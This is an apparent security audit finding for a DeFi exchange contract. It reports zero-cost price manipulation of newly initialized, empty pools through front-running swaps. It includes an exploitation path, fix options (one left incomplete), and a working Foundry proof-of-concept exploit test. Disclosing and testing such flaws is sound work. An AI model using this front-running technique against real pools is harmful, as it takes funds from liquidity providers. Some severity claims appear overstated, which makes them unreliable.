## Title
Zero-Cost Pool Price Manipulation via Zero-Liquidity Swaps After Initialization

## Summary
The Core.swap function allows price manipulation on newly initialized pools without consuming any tokens when liquidity is zero. An attacker can monitor PoolInitialized events or mempool transactions, then front-run the first liquidity addition by swapping the empty pool to an arbitrary price at zero cost, causing liquidity providers to deposit at manipulated prices and enabling profitable arbitrage.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` (Core.swap_6269342730 function, lines 506-854, specifically the zero-liquidity handling at lines 623-625) [1](#0-0) 

**Intended Logic:** When a pool is initialized, it should maintain its initial price until liquidity is added. The first liquidity providers should be able to deposit at the price they expect based on the initialization tick.

**Actual Logic:** The swap function contains a special case for zero-liquidity pools where the price moves directly to the `sqrtRatioLimit` without any token exchange. The code sets `sqrtRatioNext = limitedNextSqrtRatio` when `stepLiquidity == 0`, allowing the price to move freely across the entire tick range without consuming any tokens from the swapper. [2](#0-1) 

When the swap loop exits at this condition with `sqrtRatio == sqrtRatioLimit`, both `calculatedAmount` and `specifiedAmountDelta` remain zero, resulting in zero token transfers. [3](#0-2) 

**Exploitation Path:**
1. **Pool Initialization**: Victim initializes a pool at fair market price (e.g., WETH/USDC at tick corresponding to $3000/ETH) [4](#0-3) 

2. **Attacker Monitoring**: Attacker monitors PoolInitialized events or observes pending transactions in mempool showing the victim plans to add liquidity [5](#0-4) 

3. **Zero-Cost Price Manipulation**: Attacker front-runs with a swap transaction setting `sqrtRatioLimit` to a manipulated price (e.g., tick corresponding to $1000/ETH). Because liquidity is zero, the swap costs zero tokens but moves the pool price.

4. **Victim Impact**: When the victim adds liquidity via `deposit()`, it reads the current (manipulated) pool price and calculates token amounts based on this wrong price [6](#0-5) 

5. **Attacker Profit**: Attacker can now:
   - Swap back toward fair market price, extracting value from the victim's liquidity
   - Add their own liquidity at the favorable manipulated price
   - Sandwich subsequent deposits from other users attempting to correct the price

**Security Property Broken:** This vulnerability breaks the expected behavior that pool initialization sets a stable starting price for liquidity provision. It also enables griefing attacks that can DOS liquidity additions if victims use proper slippage protection (their transactions will revert with `DepositFailedDueToSlippage`). [7](#0-6) 

## Impact Explanation
- **Affected Assets**: All newly initialized pools are vulnerable. Liquidity providers depositing into pools with zero liquidity lose funds through unfavorable token ratios or face DOS attacks.
- **Damage Severity**: 
  - Direct financial loss: LPs deposit 3x more of one token than intended in the example scenario ($3000 vs $1000 price)
  - DOS impact: LPs with proper slippage protection cannot deposit at all until the price is manually corrected
  - Market manipulation: Enables profitable sandwich attacks on initial liquidity deposits
- **User Impact**: Any user attempting to be the first liquidity provider in a pool is vulnerable. This affects protocol adoption as new trading pairs cannot be safely bootstrapped.

## Likelihood Explanation
- **Attacker Profile**: Any user with the ability to submit transactions (no special privileges required)
- **Preconditions**: 
  - Pool must be initialized but have zero liquidity
  - Attacker must front-run before first liquidity addition
  - Easy to monitor via PoolInitialized events or mempool observation
- **Execution Complexity**: Single transaction with standard swap parameters. No complex setup required.
- **Frequency**: Can be exploited once per pool at initialization, affecting every new trading pair. Given the protocol's multichain deployment ambitions, this impacts potentially hundreds of pools.

## Recommendation

**Option 1: Require Minimum Liquidity at Initialization**

Modify `initializePool` to require immediate liquidity deposit, preventing the zero-liquidity window:

```solidity
// In src/Core.sol, create a new function:

/// @notice Initialize pool with required minimum liquidity
/// @dev Prevents zero-liquidity price manipulation by requiring immediate deposit
function initializePoolWithLiquidity(
    PoolKey memory poolKey, 
    int32 tick,
    uint128 minLiquidity
) external returns (SqrtRatio sqrtRatio) {
    // Initialize pool as before
    sqrtRatio = initializePool(poolKey, tick);
    
    // Require immediate liquidity deposit
    require(minLiquidity > 0, "Must provide initial liquidity");
    
    // Force caller to deposit liquidity in same transaction
    // This would need to integrate with the lock pattern
    // Implementation left as exercise - requires refactoring
}
```

**Option 2: Prevent Swaps on Zero-Liquidity Pools**

Add a check in the swap function to revert if liquidity is zero:

```solidity
// In src/Core.sol, function swap_6269342730, after line 542:

if (liquidity == 0) {
    revert CannotSwapEmptyPool();
}
```

This simple fix prevents the entire attack vector by disallowing swaps until liquidity is added.

**Option 3: Rate Limit Price Changes After Initialization**

Track initialization time and limit price movement in the first N blocks:

```solidity
// Add to pool state storage:
mapping(PoolId => uint256) public poolInitializedAt;

// In initializePool, after line 91:
poolInitializedAt[poolId] = block.number;

// In swap function, add check:
if (block.number < poolInitializedAt[poolId] + INITIALIZATION_DELAY) {
    // Limit price movement to X% from initial price
    require(
        sqrtRatioLimit.isWithinBounds(initialSqrtRatio, MAX_INITIAL_DEVIATION),
        "Price change too large during initialization period"
    );
}
```

**Recommended Solution:** Option 2 is the simplest and most effective. It directly addresses the root cause without adding complexity or requiring major architectural changes.

## Proof of Concept

```solidity
// File: test/Exploit_ZeroLiquidityPriceManipulation.t.sol
// Run with: forge test --match-test test_zeroLiquidityPriceManipulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {CoreLib} from "../src/libraries/CoreLib.sol";
import {tickToSqrtRatio, sqrtRatioToTick} from "../src/math/ticks.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {createFullRangePoolConfig} from "../src/types/poolConfig.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";

contract Exploit_ZeroLiquidityPriceManipulation is FullTest {
    using CoreLib for *;

    function test_zeroLiquidityPriceManipulation() public {
        // SETUP: Victim wants to initialize pool at fair market price (tick 1000)
        int32 fairTick = 1000;
        int32 manipulatedTick = -5000; // Attacker's target price
        
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: createFullRangePoolConfig({_fee: 0, _extension: address(0)})
        });
        
        // Victim initializes pool at fair price
        core.initializePool(poolKey, fairTick);
        
        // Verify initialization at fair price
        (SqrtRatio currentPrice, int32 currentTick,) = core.poolState(poolKey.toPoolId()).parse();
        assertEq(currentTick, fairTick, "Pool initialized at fair tick");
        
        // EXPLOIT: Attacker front-runs first LP by swapping to manipulated price
        // This costs ZERO tokens because liquidity is zero
        uint256 attackerToken0Before = token0.balanceOf(address(this));
        uint256 attackerToken1Before = token1.balanceOf(address(this));
        
        router.swap({
            poolKey: poolKey,
            isToken1: manipulatedTick < fairTick, // Swap direction to reach manipulated price
            amount: type(int128).min, // Exact output (will be zero)
            sqrtRatioLimit: tickToSqrtRatio(manipulatedTick),
            skipAhead: 0,
            calculatedAmountThreshold: type(int128).min,
            recipient: address(0)
        });
        
        // VERIFY: Price was manipulated without spending tokens
        (currentPrice, currentTick,) = core.poolState(poolKey.toPoolId()).parse();
        assertEq(currentTick, manipulatedTick, "Pool price manipulated to attacker's target");
        
        uint256 attackerToken0After = token0.balanceOf(address(this));
        uint256 attackerToken1After = token1.balanceOf(address(this));
        
        // Attacker spent ZERO tokens to manipulate price
        assertEq(attackerToken0Before, attackerToken0After, "Attacker spent zero token0");
        assertEq(attackerToken1Before, attackerToken1After, "Attacker spent zero token1");
        
        // IMPACT: Victim now adds liquidity at manipulated price
        // They will provide wrong token ratio and suffer financial loss
        console.log("Attack successful: Pool price manipulated from tick %d to tick %d at zero cost", 
                    fairTick, manipulatedTick);
    }
}
```

## Notes

The vulnerability exists because the protocol intentionally allows price movement on zero-liquidity pools (as confirmed by test patterns in SwapTest.t.sol that use this mechanism to "move starting price"). However, this design choice creates a critical security vulnerability during the initialization phase where pools are legitimately at zero liquidity. [8](#0-7) 

The issue is particularly severe because:
1. It's completely free to execute (zero tokens consumed)
2. It affects every new pool initialization
3. It can be automated by monitoring events or mempool
4. There's no way for honest users to defend against it without off-chain coordination

This represents a fundamental flaw in the pool bootstrapping mechanism that must be addressed before mainnet deployment.

### Citations

**File:** src/Core.sol (L72-101)
```text
    function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
        poolKey.validate();

        address extension = poolKey.config.extension();
        if (extension != address(0)) {
            StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

            if (isExtensionRegisteredSlot.load() == bytes32(0)) {
                revert ExtensionNotRegistered();
            }

            IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
        }

        PoolId poolId = poolKey.toPoolId();
        PoolState state = readPoolState(poolId);
        if (state.isInitialized()) revert PoolAlreadyInitialized();

        sqrtRatio = tickToSqrtRatio(tick);
        writePoolState(poolId, createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: 0}));

        // initialize these slots so the first swap or deposit on the pool is the same cost as any other swap
        StorageSlot fplSlot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
        fplSlot0.store(bytes32(uint256(1)));
        fplSlot0.next().store(bytes32(uint256(1)));

        emit PoolInitialized(poolId, poolKey, tick, sqrtRatio);

        IExtension(extension).maybeCallAfterInitializePool(msg.sender, poolKey, tick, sqrtRatio);
    }
```

**File:** src/Core.sol (L623-625)
```text
                    if (stepLiquidity == 0) {
                        // if the pool is empty, the swap will always move all the way to the limit price
                        sqrtRatioNext = limitedNextSqrtRatio;
```

**File:** src/Core.sol (L806-808)
```text
                    if (amountRemaining == 0 || sqrtRatio == sqrtRatioLimit) {
                        break;
                    }
```

**File:** src/Core.sol (L811-822)
```text
                int128 calculatedAmountDelta =
                    SafeCastLib.toInt128(FixedPointMathLib.max(type(int128).min, calculatedAmount));

                int128 specifiedAmountDelta;
                int128 specifiedAmount = params.amount();
                assembly ("memory-safe") {
                    specifiedAmountDelta := sub(specifiedAmount, amountRemaining)
                }

                balanceUpdate = isToken1
                    ? createPoolBalanceUpdate(calculatedAmountDelta, specifiedAmountDelta)
                    : createPoolBalanceUpdate(specifiedAmountDelta, calculatedAmountDelta);
```

**File:** src/base/BasePositions.sol (L80-83)
```text
        SqrtRatio sqrtRatio = CORE.poolState(poolKey.toPoolId()).sqrtRatio();

        liquidity =
            maxLiquidity(sqrtRatio, tickToSqrtRatio(tickLower), tickToSqrtRatio(tickUpper), maxAmount0, maxAmount1);
```

**File:** src/base/BasePositions.sol (L85-87)
```text
        if (liquidity < minLiquidity) {
            revert DepositFailedDueToSlippage(liquidity, minLiquidity);
        }
```

**File:** test/SwapTest.t.sol (L54-62)
```text
        router.swap({
            poolKey: poolKey,
            isToken1: current > sqrtRatio,
            amount: type(int128).min,
            sqrtRatioLimit: sqrtRatio,
            skipAhead: 0,
            calculatedAmountThreshold: type(int128).min,
            recipient: address(0)
        });
```
